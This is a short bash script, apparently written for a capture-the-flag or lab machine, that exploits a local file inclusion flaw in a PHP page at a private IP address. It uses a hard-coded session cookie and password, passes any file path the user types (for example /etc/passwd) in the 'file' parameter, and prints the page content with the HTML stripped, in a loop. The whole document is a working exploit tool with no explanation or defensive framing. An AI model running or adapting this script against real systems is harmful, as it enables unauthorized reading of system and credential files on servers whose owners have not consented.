#!/bin/bash

# Usage: ./lfiread.sh /etc/passwd

TARGET="http://10.10.6.73:1337/file1010111/index.php"
SESSION="5k0dokl3ec1ai53l9a055a548i"

read -p "Enter file to read: " FILE

while true; do
    curl -s -X POST "${TARGET}?file=${FILE}" \
        -H "Cookie: PHPSESSID=${SESSION}" \
        -d "password=easytohack" | \
        sed -n '/<main/,/<\/main>/p' | \
        sed -e 's/<[^>]*>//g'

	read -p "Enter file to read: " FILE
done
